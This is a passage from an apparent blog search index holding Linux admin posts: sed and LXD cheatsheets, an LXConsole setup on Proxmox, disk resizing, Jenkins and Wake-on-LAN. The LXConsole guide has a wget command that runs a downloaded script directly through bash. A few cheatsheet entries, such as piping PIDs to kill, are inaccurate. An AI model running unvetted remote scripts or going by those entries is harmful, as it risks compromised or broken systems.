    "content": "Regular expressions.  Replace the first occurrence of a string in a file, and print the result:    sed 's/find/replace/' filename        Replace only on lines matching the line pattern:    sed '/line_pattern/s/find/replace/'        Replace all occurrences of a string in a file, overwriting the file (i.e. in-place):    sed -i 's/find/replace/g' filename        Replace all occurrences of an extended regular expression in a file:    sed -r 's/regex/replace/g' filename        Apply multiple find-replace expressions to a file:    sed -e 's/find/replace/' -e 's/find/replace/' filename      File spacing  double space a file    sed G        double space a file which already has blank lines in it. Output file should contain no more than one blank line between lines of text.    sed '/^$/d;G'        triple space a file    sed 'G;G'        undo double-spacing (assumes even-numbered lines are always blank)    sed 'n;d'        insert a blank line above every line which matches “regex”    sed '/regex/{x;p;x;}'        insert a blank line below every line which matches “regex”    sed '/regex/G'        insert a blank line above and below every line which matches “regex”    sed '/regex/{x;p;x;G;}'      Userful  List out the second column in the table.    cat text/table.txt | sed 1d | awk '{ print $2 }'        Sum the columns in the table.    cat text/table.txt | sed 1d | awk '{ sum += $2 } END { print sum }'        Kills all processes by name.    ps aux | grep chrome | awk '{ print $2 }' | kill (or) pkill chrome        Deletes trailing whitespace.    sed 's/\\s\\+$//g' filename        Deletes all blank lines from file.    sed '/^$/d' filename        Insert ‘use strict’ to the top of every js file.    sed \"1i 'use strict';\" *.js        Append a new line at the end of every file.    sed '1a \\n' *        Generate random numbers and then sort.    for i in {1..20}; do echo $(($RANDOM * 777 * $i)); done | sort -n        Commatize numbers.    sed -r ':loop; s/(.*[0-9])([0-9]{3})/\\1,\\2/; t loop' text/numbers.txt      Sed Print  Print contents of a file.    sed -n '/fox/p' text/* (or) sed -n '/Sysadmin/p' text/geek.txt        Print lines starting with 3 and skipping by 2.    sed -n '3~2p' text/geek.txt        Print the last line.    sed -n '$p' text/geek.txt        Prints the lines matching the between the two patterns.    sed -n '/Hardware/,/Website/p' text/geek.txt    Sed Print Number    Prints the line number for all lines in the file.    sed -n '=' filename        Prints the line number that matches the pattern.    sed -n '/Linux/=' filename        Prints the line number in range of two patterns (inclusive).    sed -n '/Linux/,/Hardware/=' filename        Prints the total number of lines.    sed -n '$=' filename        number each line of a file (simple left alignment). Using a tab (see note on ‘\\t’ at end of file) instead of space will preserve margins.    sed = filename | sed 'N;s/\\n/\\t/'        number each line of a file (number on left, right-aligned)    sed = filename | sed 'N; s/^/     /; s/ *\\(.\\{6,\\}\\)\\n/\\1  /'        number each line of file, but only print numbers if line is not blank    sed '/./=' filename | sed '/./N; s/\\n/ /'        count lines (emulates “wc -l”)    sed -n '$='      Sed DeleteThe d command performs a deletion.  Deletes the 3rd line from beginning of file.    sed '3d' text/geek.txt        Delete every lines starting from 3 and skipping by 2.    sed '3~2d' text/geek.txt        Delete lines from 3 to 5.    sed '3,5d' text/geek.txt        Delete the last line.    sed '$d' text/geek.txt        Delete lines matching the pattern.    sed '/Sysadmin/d' text/geek.txt        delete lines matching pattern     sed '/pattern/d'        delete ALL blank lines from a file (same as “grep ‘.’ “)     sed '/^$/d'                           # method 1 sed '/./!d'                           # method 2        Sed Substitute    The s command performs a substitution.    Simple substituion for the first result.    sed 's/Linux/Unix/' text/geek.txt        Simple substituion for global instances.    sed 's/Linux/Unix/g' text/geek.txt        Replace nth instance.    sed 's/Linux/Unix/2' text/geek.txt        Write matched lines to output.    sed -n 's/Linux/Unix/gp' text/geek.txt &gt; text/geek-sub.txt        Use regex group for capturing additional patterns (up to 9).    sed 's/\\(Linux\\).\\+/\\1/g' text/geek.txt        sed -r 's/(Linux).+/\\1/g' text/geek.txt        Remove the last word.    sed -r 's/\\d$//g' text/geek.txt        Remove all letters.    sed -r 's/[a-zA-Z]//g' text/geek.txt        Remove html tags (WIP).    sed -r 's|(&lt;/?[a-z]+&gt;)||g' text/html.txt        Commatize any number.    sed ':a;s/\\B[0-9]\\{3\\}\\&gt;/,&amp;/;ta' text/numbers.txt        sed -r ':loop; s/\\B[0-9]{3}\\&gt;/,&amp;/; t loop' text/numbers.txt      Sed TransformThe y command performs a transformation.  Converts all lowercase chars to uppercase.    sed 'y/abcdefghijklmnopqrstuvwxyz/ABCDEFGHIJKLMNOPQRSTUVWXYZ/' text/geek.txt        Converts all uppercase chars to lowercase.    sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ/abcdefghijklmnopqrstuvwxyz/' text/geek.txt        Perform a two character shift.    sed 'y/abcdefghijklmnopqrstuvwxyz/cdefghijklmnopqrstuvwxyzab/' text/geek.txt      Special appplicatoins  get Usenet/e-mail message header    sed '/^$/q'                # deletes everything after first blank line        get Usenet/e-mail message body    sed '1,/^$/d'              # deletes everything up to first blank line        get Subject header, but remove initial “Subject: “ portion    sed '/^Subject: */!d; s///;q'        get return address header    sed '/^Reply-To:/q; /^From:/h; /./d;g;q'      Sed Multiple Commands  The -e flag allows for multiple commands.    sed -r -e 's/etc\\.*//g' -e 's/(\\s+)(\\))/\\2/g' text/geek.tx      "
  },
  
  {
    "title": "lxd",
    "url": "/posts/lxdcs/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2024-12-20 00:00:00 +0530",
    





    
    "snippet": "Useful LXD commandsList available containerslxc image list ubuntu:        # ubuntu: is officially supported image sourcelxc image list images:        # images: is an unsupported sourcelxc image ali...",
    "content": "Useful LXD commandsList available containerslxc image list ubuntu:        # ubuntu: is officially supported image sourcelxc image list images:        # images: is an unsupported sourcelxc image alias list images:  # lists user-friendly namesLaunch a containerThis creates and starts a container.lxc launch ubuntu:14.04 CONTAINERNAME   # image and container names are optional lxc launch ubuntu:14.04/armhf armcont   # specific architecturelxc launch images:alpine/3.3/amd64      # unsupported images: sourceCreate containerWithout starting it.lxc init images:alpine/3.3/amd64 alpinecontlxc copy CONTAINER1 CONTAINER2        # clonelxc delete alpinecont [--force]       # --force if it is runningStart/stop after creating itlxc start alpinecontlxc stop alpinecont [--force]         # --force if it doesn't want to stoplxc restart alpinecont [--force]lxc pause alpinecont                  # SIGSTOP to all container processesList local containerslxc list lxc list --columns \"nsapt\"            # name, status, arch, PID of init, typelxc list security.privileged=true     # filter for propertieslxc info CONTAINERNAME                # detailed info about one containerAvailable columns for the list command    4 - IPv4 address    6 - IPv6 address    a - Architecture    c - Creation date    n - Name    p - PID of the container's init process    P - Profiles    s - State    S - Number of snapshots    t - Type (persistent or ephemeral)Renamelxc move CONTAINERNAME NEWNAMEConfigurationConfig changes are  effective immediately, even if container is running.export VISUAL=/usr/bin/vimlxc config edit CONTAINERNAME           # launches editorlxc config set CONTAINERNAME KEY VALUE  # change a single config itemlxc config device add CONTAINERNAME DEVICE TYPE KEY=VALUElxc config show [--expanded] CONTAINERNAMEConfiguration settings can be saved as **profiles**.Enter the containerlxc exec CONTAINERNAME -- PROGRAM OPTIONSlxc exec CONTAINERNAME shlxc exec CONATINERNAME --env KEY=VALUE PROGRAM   # environment variableThis command runs the program in all the namespaces and cgroups of the container. The program must exist inside the container.Access container fileslxc file pull CONTAINERNAME/etc/passwd /tmp/mypasswdlxc file push /tmp/mypasswd CONTAINERNAME/etc/passwd lxc file edit CONTAINERNAME/etc/passwd Snapshotslxc snapshot CONTAINERNAME SNAPNAME                        # SNAPNAME is optional; default name snap*X*lxc restore CONTAINERNAME SNAPNAME                         # resets the container to snapshotlxc copy CONTAINERNAME/SNAPNAME NEWCONTAINER               # new container from snapshotlxc delete CONTAINERNAME/SNAPNAME                              lxc info CONTAINERNAME                                     # lists snapshots among other infolxc move CONTAINERNAME/SNAPNAME CONTAINERNAME/NEWSNAPNAME  # rename snapshot"
  },
  
  {
    "title": "lxconsole",
    "url": "/posts/lxconsole/",
    "categories": "Virtualization",
    "tags": "",
    "date": "2024-12-20 00:00:00 +0530",
    





    
    "snippet": "LXConsole is an open-source web-based application designed to simplify the management of LXD servers. It offers a convenient graphical user interface that allows users to manage multiple Incus (LXD...",
    "content": "LXConsole is an open-source web-based application designed to simplify the management of LXD servers. It offers a convenient graphical user interface that allows users to manage multiple Incus (LXD’s fork) and LXD containers. In this blog, we will guide you through the entire process of setting up and using LXConsole, from launching a Debian instance to managing LXD containers seamlessly through a web interface.Stpe1: Launching the Debian instanceTo begin with, you need a Debian instance. This can be easily achieved using Proxmox helper scripts. These scripts automate the setup process, saving you time and effort. To launch the Debian instance, execute the following command:bash -c \"$(wget -qLO - https://github.com/community-scripts/ProxmoxVE/raw/main/ct/debian.sh)\"This command will download and execute a script that sets up a Debian container on your Proxmox environment. After running the script, you should have a Debian instance ready for further configuration.    ____       __    _   / __ \\___  / /_  (_)___ _____  / / / / _ \\/ __ \\/ / __ `/ __ \\ / /_/ /  __/ /_/ / / /_/ / / / //_____/\\___/_.___/_/\\__,_/_/ /_/  🧩  Using Advanced Settings  🖥️   Operating System: debian  🌟  Version: 12  📦  Container Type: Privileged  🔐  Root Password: ********  🆔  Container ID: XXX  🏠  Hostname: lxconsole  💾  Disk Size: 2  🧠  CPU Cores: 1  🛠️   RAM Size: 512  🌉  Bridge: vmbr0  📡  IP Address: XXXXXXXXXX  🌐  Gateway IP Address: XXXXXXXXXX  📡  APT-Cacher IP Address: Default  🚫  Disable IPv6: no  ⚙️   Interface MTU Size: Default  🔍  DNS Search Domain: Host  📡  DNS Server IP Address: Host  🏷️   Vlan: Default  🔑  Root SSH Access: yes  🔍  Verbose Mode: yes  🚀  Creating a Debian LXC using the above advanced settings  ✔️   Using XXXXXXXXXX for Template Storage.  ✔️   Using XXXXXXXXXX for Container Storage.  ✔️   Updated LXC Template List  ✔️   LXC Container XXX was successfully created.  ✔️   Started LXC Container  ✔️   Set up Container OS  ✔️   Network Connected: XXXXXXXXXX  ✔️   IPv4 Internet Connected  ✖️   IPv6 Internet Not Connected  ✔️   DNS Resolved github.com to XXXX:XXXX:XXXX::XXXX:XXXX  ✔️   Updated Container OS  ✔️   Installed Dependencies  ✔️   Cleaned  ✔️   Completed Successfully!  🚀  Debian setup has been successfully initialized!Step2: Configuring the LXconsoleOnce your server has booted and is running, you can connect to the server and start configuring LXConsole. To do this, use the LXC console to access your Debian server.❯ lxc-console XXXConnected to tty 1Type &lt;Ctrl+a q&gt; to exit the console, &lt;Ctrl+a Ctrl+a&gt; to enter Ctrl+a itselflxconsole login: lxconsole login: rootPassword: Debian LXC Container    🖥️    OS: Debian GNU/Linux - Version: 12    🏠   Hostname: lxconsole    💡   IP Address: XXXXXXXXXXroot@lxconsole:~# Next, install essential packages such as Git, Python 3, and Pip to prepare the environment for LXConsole:sudo apt install git python3 python3-pipOnce these packages are installed, clone the LXConsole repository from GitHub and install the necessary requirements:root@lxconsole:~# git clone https://github.com/PenningLabs/lxconsole.gitCloning into 'lxconsole'...remote: Enumerating objects: 3258, done.remote: Counting objects: 100% (797/797), done.remote: Compressing objects: 100% (287/287), done.remote: Total 3258 (delta 573), reused 719 (delta 500), pack-reused 2461 (from 1)Receiving objects: 100% (3258/3258), 22.76 MiB | 4.03 MiB/s, done.Resolving deltas: 100% (1143/1143), done.root@lxconsole:~# cd lxconsole &amp;&amp; pip3 install -r requirements.txtOnce the installation is complete, run LXConsole by executing the run.py file:python3 run.pyStep3: Creating the systemd fileTo ensure LXConsole starts automatically when the system boots up, you need to create a systemd service file. This will configure LXConsole to launch as a service during system startup.First, create the service file with the following command:touch /etc/systemd/system/lxconsole.serviceNext, add the following content to the file using you favourite editor or choice (eg: nano, vim) making sure to update the paths according to your environment:[Unit]Description=LXConsoleAfter=network.target[Service]Type=simpleUser=$USERWorkingDirectory=/location/to/gitclone/lxconsole/ExecStart=/usr/bin/python3 /location/to/gitclone/lxconsole/run.pyRestart=on-failure[Install]WantedBy=multi-user.targetAfter saving the file, reload the systemd daemon to apply the changes and start the LXConsole service:systemctl daemon-reloadsystemctl restart lxconsole.serviceThis ensures that LXConsole will run on startup and be ready to manage your LXD containers.Step4: Installing the lxdIf you dont have lxd server preconfigured you can install the lxd server by using the following stepsAs we are using the debian operating system debain has the apt package manager we use the apt package manager to install the lxd and initilaze itsudo apt-get install lxdlxd initDuring the initialization process, you will be prompted with a series of questions to configure LXD. Here’s a sample of what the configuration might look like:root@lxconsole:~/lxd# lxd initWould you like to use LXD clustering? (yes/no) [default=no]: Do you want to configure a new storage pool? (yes/no) [default=yes]: Name of the new storage pool [default=default]: lxdpoolWould you like to connect to a MAAS server? (yes/no) [default=no]: Would you like to create a new local network bridge? (yes/no) [default=yes]: What should the new bridge be called? [default=lxdbr0]: What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: Would you like the LXD server to be available over the network? (yes/no) [default=no]: yesAddress to bind LXD to (not including port) [default=all]: Port to bind LXD to [default=8443]: Trust password for new clients: Again: Would you like stale cached images to be updated automatically? (yes/no) [default=yes]: Would you like a YAML \"lxd init\" preseed to be printed? (yes/no) [default=no]: root@lxconsole:~/lxd#Once you complete the configuration, LXD will be set up and ready to use.Step5: Accessing the lxconsoleNow that LXConsole is installed and running, you can access the web-based user interface. Open your browser and navigate to:http://$SERVER_IP:5000During the first boot of LXConsole, you will be prompted to register and log in with your credentials.Step6: Adding the lxd server to the lxconsoleOnce you loged in add the existing lxd container to the lxconsole to connect and manage the lxd conatiners                               Before adding the server to the lxconsole we need to add the client trusted certicateroot@lxconsole:~/lxd# nano lxconsole.crtroot@lxconsole:~/lxd# lxc config trust add lxconsole.crtroot@lxconsole:~/lxd# lxc config set core.https_address [::]Once the server is added successfully, you can begin managing your LXD containers and virtual machines via LXConsole.step7: Launching the lxd container (alpine)As we have configured lxd and lxconsole lets launch the alpine lxd container. Start by searching for available LXD images Then, launch a container using a specific image by executing the following command for example, to launch an Alpine Linux container, you can use:lxc image list imageslxc launch images:{distro}/{version}/{arch} {container-name-here}lxc info {distro}root@lxconsole:~/lxd# lxc image list images: | grep alpine | grep x86_64 | grep -i container| alpine/3.17 (3 more)                     | 25716e82c54e | yes    | Alpine 3.17 amd64 (20241218_0021)         | x86_64       | CONTAINER       | 2.94MB    | Dec 18, 2024 at 12:00am (UTC) || alpine/3.17/cloud (1 more)               | 0ffc7b828a14 | yes    | Alpine 3.17 amd64 (20241218_0021)         | x86_64       | CONTAINER       | 19.49MB   | Dec 18, 2024 at 12:00am (UTC) || alpine/3.18 (3 more)                     | 2dac80bf43a5 | yes    | Alpine 3.18 amd64 (20241218_0022)         | x86_64       | CONTAINER       | 2.95MB    | Dec 18, 2024 at 12:00am (UTC) || alpine/3.18/cloud (1 more)               | 959a3da69418 | yes    | Alpine 3.18 amd64 (20241218_0021)         | x86_64       | CONTAINER       | 20.79MB   | Dec 18, 2024 at 12:00am (UTC) || alpine/3.19 (3 more)                     | 52a2cf969e89 | yes    | Alpine 3.19 amd64 (20241218_0022)         | x86_64       | CONTAINER       | 2.93MB    | Dec 18, 2024 at 12:00am (UTC) || alpine/3.19/cloud (1 more)               | 305be1b7f6cf | yes    | Alpine 3.19 amd64 (20241218_0021)         | x86_64       | CONTAINER       | 20.98MB   | Dec 18, 2024 at 12:00am (UTC) || alpine/3.20 (3 more)                     | 9eef9c97c1a5 | yes    | Alpine 3.20 amd64 (20241218_0021)         | x86_64       | CONTAINER       | 3.08MB    | Dec 18, 2024 at 12:00am (UTC) || alpine/3.20/cloud (1 more)               | d75bd38b9454 | yes    | Alpine 3.20 amd64 (20241218_0021)         | x86_64       | CONTAINER       | 19.67MB   | Dec 18, 2024 at 12:00am (UTC) || alpine/edge (3 more)                     | 2e72675086fe | yes    | Alpine edge amd64 (20241218_0021)         | x86_64       | CONTAINER       | 3.09MB    | Dec 18, 2024 at 12:00am (UTC) || alpine/edge/cloud (1 more)               | 6426f253d902 | yes    | Alpine edge amd64 (20241218_0021)         | x86_64       | CONTAINER       | 20.13MB   | Dec 18, 2024 at 12:00am (UTC) |root@lxconsole:~/lxd# lxc launch images:alpine/3.20/amd64 alpineCreating alpineStarting alpine                           root@lxconsole:~/lxd# lxc list+--------+---------+----------------------+-----------------------------------------------+-----------+-----------+|  NAME  |  STATE  |         IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |+--------+---------+----------------------+-----------------------------------------------+-----------+-----------+| alpine | RUNNING | XX.XX.XX.XX (eth0) | XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX (eth0) | CONTAINER | 0         |+--------+---------+----------------------+-----------------------------------------------+-----------+-----------+root@lxconsole:~/lxd# lxc info alpineName: alpineStatus: RUNNINGType: containerArchitecture: x86_64PID: 42834Created: 2024/12/18 16:34 ISTLast Used: 2024/12/18 16:34 ISTResources:  Processes: 5  CPU usage:    CPU usage (in seconds): 0  Memory usage:    Memory (current): 1.08MiB  Network usage:    eth0:      Type: broadcast      State: UP      Host interface: vethf8073443      MAC address: XX:XX:XX:XX:XX:XX      MTU: 1500      Bytes received: 48.06kB      Bytes sent: 1.73kB      Packets received: 1099      Packets sent: 15      IP addresses:        inet:  XX.XX.XX.XX (global)        inet6: XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX/64 (global)        inet6: XXXX::XXXX:XXXX:XXXX:XXXX/64 (link)    lo:      Type: loopback      State: UP      MTU: 65536      Bytes received: 0B      Bytes sent: 0B      Packets received: 0      Packets sent: 0      IP addresses:        inet:  127.0.0.1/8 (local)        inet6: ::1/128 (local)As we have launched the lxc container to connect to the newly created container, execute:lxc exec {containername} {command}root@lxconsole:~# lxc exec alpine sh~ # cat /etc/os-release NAME=\"Alpine Linux\"ID=alpineVERSION_ID=3.20.3PRETTY_NAME=\"Alpine Linux v3.20\"HOME_URL=\"https://alpinelinux.org/\"BUG_REPORT_URL=\"https://gitlab.alpinelinux.org/alpine/aports/-/issues\"~ # launching the Debian containerHere’s an elaboration of the section:Let’s launch the Debian container in the same way we did with the Alpine container. To do this, we first need to filter out the specific image we intend to use from the list of available images. In this case, we’re opting for the “debian/12/cloud” image, which is a cloud-specific version of Debian 12. This image is optimized for cloud environments, making it ideal for container deployment.To select the image, we can run the lxc image list command, which will display a list of available images from various sources. We can use the grep command to filter through the output and narrow down the list to only the Debian 12 cloud images.Once we have the correct image identified, we can proceed to launch the container. The command we’ll use is lxc launch, followed by the image reference (images:debian/12/cloud). This will create and start the container, naming it “debian” in the process. The container will then be accessible for further management or use.&gt; root@lxconsole:~# lxc image list images: | grep debian/12| debian/12 (7 more)                       | 13829fee748c | yes    | Debian bookworm amd64 (20250102_0002)     | x86_64       | CONTAINER       | 96.04MB   | Jan 2, 2025 at 12:00am (UTC)  || debian/12 (7 more)                       | ec5f73713766 | yes    | Debian bookworm amd64 (20250102_0002)     | x86_64       | VIRTUAL-MACHINE | 351.38MB  | Jan 2, 2025 at 12:00am (UTC)  || debian/12/arm64 (3 more)                 | 7f5fbadc7060 | yes    | Debian bookworm arm64 (20241230_0004)     | aarch64      | CONTAINER       | 93.10MB   | Dec 30, 2024 at 12:00am (UTC) || debian/12/cloud (3 more)                 | 9e3c8ec9bab8 | yes    | Debian bookworm amd64 (20250102_0002)     | x86_64       | VIRTUAL-MACHINE | 394.74MB  | Jan 2, 2025 at 12:00am (UTC)  || debian/12/cloud (3 more)                 | b7ef0541b199 | yes    | Debian bookworm amd64 (20250102_0002)     | x86_64       | CONTAINER       | 122.26MB  | Jan 2, 2025 at 12:00am (UTC)  || debian/12/cloud/arm64 (1 more)           | 29ec992650ff | yes    | Debian bookworm arm64 (20241230_0004)     | aarch64      | CONTAINER       | 118.60MB  | Dec 30, 2024 at 12:00am (UTC) |&gt; root@lxconsole:~# lxc launch images:debian/12/cloud debianCreating debianStarting debian                           &gt; root@lxconsole:~# lxc list+--------+---------+----------------------+-----------------------------------------------+-----------+-----------+|  NAME  |  STATE  |         IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |+--------+---------+----------------------+-----------------------------------------------+-----------+-----------+| debian | RUNNING | 10.150.239.33 (eth0) | fd42:f569:921f:766a:216:3eff:fe0f:6cc6 (eth0) | CONTAINER | 0         |+--------+---------+----------------------+-----------------------------------------------+-----------+-----------+&gt; root@lxconsole:~# lxc exec debian /bin/bash&gt; root@debian:~#LXConsole allows you to manage the containers, view logs, and perform other administrative tasks from a central web interface, making it a powerful tool for container management.With LXConsole up and running, you now have a comprehensive web-based solution for managing your LXD containers. Whether you’re deploying new containers, configuring existing ones, or monitoring your containerized environment, LXConsole offers an intuitive and efficient interface to simplify the process.For those looking to deepen their understanding of LXD commands and management, we’ve ceated LXC Cheat Sheet, which serves as a handy reference for common LXC commands and their usage."
  },
  
  {
    "title": "Disk Management on proxmoxVM",
    "url": "/posts/Diskmanagement/",
    "categories": "Virtualization",
    "tags": "",
    "date": "2024-12-09 00:00:00 +0530",
    





    
    "snippet": "In this blog post, we will explore the process of increasing disk space for a Debian virtual machine (VM) running on Proxmox. This guide will detail the commands used and the output received during...",
    "content": "In this blog post, we will explore the process of increasing disk space for a Debian virtual machine (VM) running on Proxmox. This guide will detail the commands used and the output received during the resizing operation, providing a comprehensive overview for users looking to expand their VM’s storage capacity.Step 1: Resize Disk in ProxmoxFirst, you need to increase the disk size from the Proxmox GUI. This can be done by selecting your VM, navigating to the “Hardware” tab, and adjusting the disk size accordingly. After resizing the disk in Proxmox, you can verify the new size by using the parted command.root@pbs:~# parted                                                                                                                                                                            GNU Parted 3.5                                                                                                                                                                                Using /dev/sda                                                                                                                                                                                Welcome to GNU Parted! Type 'help' to view a list of commands.                                                                                                                                (parted)                                                                                                                                                                                      (parted) print                                                                                                                                                                                Warning: Not all of the space available to /dev/sda appears to be used, you can fix the GPT to use all of the space (an extra 23068672 blocks) or continue with the current setting?          Fix/Ignore? f                                                                                                                                                                                 Model: QEMU QEMU HARDDISK (scsi)                                                                                                                                                              Disk /dev/sda: 22.5GB                                                                                                                                                                         Sector size (logical/physical): 512B/512B                                                                                                                                                     Partition Table: gpt                                                                                                                                                                          Disk Flags:                                                                                                                                                                                                                                                                                                                                                                                 Number  Start   End     Size    File system  Name  Flags                                                                                                                                       1      17.4kB  1049kB  1031kB                     bios_grub                                                                                                                                   2      1049kB  538MB   537MB   fat32              boot, esp                                                                                                                                   3      538MB   10.7GB  10.2GB                     lvm                                                                                                                                        Step 2: Verify Disk SizeAfter fixing the partition table, print the partition information again:(parted) resizepart 3 100%                                                 (parted) print                                                             Model: QEMU QEMU HARDDISK (scsi)Disk /dev/sda: 22.5GBSector size (logical/physical): 512B/512BPartition Table: gptDisk Flags: Number  Start   End     Size    File system  Name  Flags 1      17.4kB  1049kB  1031kB                     bios_grub 2      1049kB  538MB   537MB   fat32              boot, esp 3      538MB   22.5GB  22.0GB                     lvmStep 3: Resize Physical VolumeNext, resize the physical volume associated with your logical volume manager (LVM):root@pbs:~# pvresize /dev/sda3  Physical volume \"/dev/sda3\" changed  1 physical volume(s) resized or updated / 0 physical volume(s) not resizedroot@pbs:~# lsblkNAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTSsda            8:0    0   21G  0 disk ├─sda1         8:1    0 1007K  0 part ├─sda2         8:2    0  512M  0 part └─sda3         8:3    0 20.5G  0 part   ├─pbs-swap 252:0    0    1G  0 lvm  [SWAP]  └─pbs-root 252:1    0  8.5G  0 lvm  /sr0           11:0    1 1024M  0 rom  root@pbs:~# df -hFilesystem                             Size  Used Avail Use% Mounted onudev                                   953M     0  953M   0% /devtmpfs                                  198M  772K  197M   1% /run/dev/mapper/pbs-root                   8.3G  7.7G  125M  99% /tmpfs                                  986M  200K  986M   1% /dev/shmtmpfs                                  5.0M     0  5.0M   0% /run/locktmpfs                                  198M     0  198M   0% /run/user/0Step 4: Extend Logical VolumeNow that the physical volume is resized, extend your logical volume using:root@pbs:~# lvextend -r -l +100%FREE /dev/mapper/pbs-root                                         Size of logical volume pbs/root changed from 8.49 GiB (2174 extents) to &lt;19.50 GiB (4991 extents).  Logical volume pbs/root successfully resized. resize2fs 1.47.0 (5-Feb-2023)Filesystem at /dev/mapper/pbs-root is mounted on /; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 3The filesystem on /dev/mapper/pbs-root is now 5110784 (4k) blocks long.Step 5: Verify Filesystem SizeFinally, check if the filesystem reflects the new size:root@pbs:~# df -hFilesystem                             Size  Used Avail Use% Mounted onudev                                   953M     0  953M   0% /devtmpfs                                  198M  792K  197M   1% /run/dev/mapper/pbs-root                    20G  7.8G   11G  43% /tmpfs                                  986M  200K  986M   1% /dev/shmtmpfs                                  5.0M     0  5.0M   0% /run/locktmpfs                                  198M     0  198M   0% /run/user/0"
  },
  
  {
    "title": "Jenkins LXC on proxmox",
    "url": "/posts/jenkins/",
    "categories": "Virtualization",
    "tags": "Linux, Jenkins",
    "date": "2024-10-04 00:00:00 +0530",
    





    
    "snippet": "In this blog post, we will go through the steps to install Jenkins in Proxmox using the TurnKey image. This method is quite simple and efficient for setting up Jenkins in a containerized environmen...",
    "content": "In this blog post, we will go through the steps to install Jenkins in Proxmox using the TurnKey image. This method is quite simple and efficient for setting up Jenkins in a containerized environment.Download Jenkins TurnKey ImageFirst, we need to download the Jenkins TurnKey image for Proxmox. Open your terminal and run the following command:❯ pveam download $storage debian-12-turnkey-jenkins_18.0-1_amd64.tar.gzThis command will download the image from the TurnKey Linux repository. You will see output indicating the progress of the download, and once it’s finished, you will have the image ready for use.❯ pveam download nasp debian-12-turnkey-jenkins_18.0-1_amd64.tar.gzdownloading http://mirror.turnkeylinux.org/turnkeylinux/images/proxmox/debian-12-turnkey-jenkins_18.0-1_amd64.tar.gz to /mnt/pve/nasp/template/cache/debian-12-turnkey-jenkins_18.0-1_amd64.tar.gz--2024-10-04 18:50:44--  http://mirror.turnkeylinux.org/turnkeylinux/images/proxmox/debian-12-turnkey-jenkins_18.0-1_amd64.tar.gzResolving mirror.turnkeylinux.org (mirror.turnkeylinux.org)... 137.226.34.46, 131.188.12.211, 2801:82:80ff:8000::eConnecting to mirror.turnkeylinux.org (mirror.turnkeylinux.org)|137.226.34.46|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 775492051 (740M) [application/octet-stream]Saving to: '/mnt/pve/nasp/template/cache/debian-12-turnkey-jenkins_18.0-1_amd64.tar.gz.tmp_dwnl.3535802'     0K ........ ........ ........ ........  4% 2.21M 5m20s 98304K ........ ........ ........ ........ 17% 3.15M 3m45s131072K ........ ........ ........ ........ 21% 3.85M 3m20s262144K ........ ........ ........ ........ 38% 3.02M 2m32s360448K ........ ........ ........ ........ 51% 3.53M 1m54s\\491520K ........ ........ ........ ........ 69% 3.90M 72s524288K ........ ........ ........ ........ 73% 3.72M 61s555360K ........ ........ ........ ........ 90% 3.43M 22s720896K ........ ........ ........ ........ 99% 4.07M 1s753664K ...                                100% 4.79M=3m58s2024-10-04 18:54:42 (3.11 MB/s) - '/mnt/pve/nasp/template/cache/debian-12-turnkey-jenkins_18.0-1_amd64.tar.gz.tmp_dwnl.3535802' saved [775492051/775492051]calculating checksum...OK, checksum verifieddownload of 'http://mirror.turnkeylinux.org/turnkeylinux/images/proxmox/debian-12-turnkey-jenkins_18.0-1_amd64.tar.gz' to 'template/cache/debian-12-turnkey-jenkins_18.0-1_amd64.tar.gz' finishedCreate a Container (CT)Now that we have the image, we can create a container using it. Here’s how you can do it:  Open Proxmox Web Interface: Go to your Proxmox web interface.  Create CT: Click on “Create CT” and follow the prompts to set up your container.  Select Template: When prompted, select the downloaded Jenkins TurnKey image as your template.Starting the Jenkins VMOnce the container is created, boot it up. When you try to access the Jenkins UI for the first time, you will see a message like this:  Welcome to TurnKey! You need to initialize this system first before you can use it. To do that you’ll need to log into the root account via SSH. The turnkey-init initialization program should start automatically After initialization try reloading this page. This message should disappear and you’ll be able to access all services on this system normally.Login into the container by using the ssh service and reset the credentialsPerform Security UpdatesFor security reasons, it is recommended to perform updates after installation. Run the following command in your terminal:Once the security patches are installed and configured reboot the containerAccess Jenkins Web UIAfter rebooting, access the Jenkins web UI again by navigating to “https://&lt;your-container-ip&gt;”. You should see the Jenkins control panel.Manage Jenkins PluginsOnce logged in, go to Manage Jenkins &gt; Manage Plugins &gt; Updates and install all latest updates for plugins.Install Dark Theme (Optional)If you prefer a dark theme, you can install it from the plugin manager as well.Final StepsAfter updating all plugins and installing any desired themes, restart your Jenkins container one last time.And that’s it! You have successfully installed Jenkins on Proxmox using a TurnKey image. Enjoy automating your builds and deployments with Jenkins!For more robust information on using Jenkins, you can refer to the official Jenkins documentation available at Jenkins Documentation"
  },
  
  {
    "title": "Wake on LAN for Proxmox Node",
    "url": "/posts/wol/",
    "categories": "Virtualization",
    "tags": "",
    "date": "2024-09-26 00:00:00 +0530",
    





    
    "snippet": "This guide explains how to set up your Proxmox node to respond to Wake-on-LAN (WoL) messages, allowing you to start your server remotely using a “magic packet.”installing toolsFirst, you’ll need to...",
    "content": "This guide explains how to set up your Proxmox node to respond to Wake-on-LAN (WoL) messages, allowing you to start your server remotely using a “magic packet.”installing toolsFirst, you’ll need to install the required tool ethtool on your Proxmox node. Open a terminal or go to your node’s shell and run:❯ sudo apt install ethtoolGet your interface name❯ ip a sThe output will list all your network interfaces. In this case, we’re looking for an interface that’s currently in use. For example:eno1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq master vmbr0 state UP group default qlen 1000    link/ether XXXXXXXXXXX brd XXXXXXXXXXX    altname enp1s0f0Here, eno1 is the name of the network interface.Check If Wake-on-LAN is EnabledBefore enabling Wake-on-LAN, it’s a good idea to check if it is already active on your interface. Run:❯ ethtool eno1 | grep Wake-onThe output will look like this:        Supports Wake-on: pumbg        Wake-on: dIn this example, Wake-on-LAN is disabled (d stands for “disabled”). We will enable it.Enable wake-on-lanTo enable the wake on lan we use the ethool and specify the insterface on which we want to enable it❯ ethtool -s eno1 wol gUpdating the Network Interfaces FileTo make sure that Wake-on-LAN stays enabled after a 